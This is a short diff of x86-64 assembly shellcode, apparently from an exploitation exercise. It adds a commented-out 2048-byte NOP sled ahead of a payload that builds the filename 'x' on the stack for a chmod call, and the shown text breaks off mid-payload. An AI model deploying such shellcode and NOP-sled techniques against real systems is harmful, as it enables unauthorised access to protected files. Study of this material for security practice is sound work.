@@ -18,6 +18,10 @@
 
 .text
 _start:
+    # nop sled
+    # .rept 2048
+    # nop
+    # .endr
     # chmod("x", 004)
     push 0x78
     mov rdi, rsp        # "x"
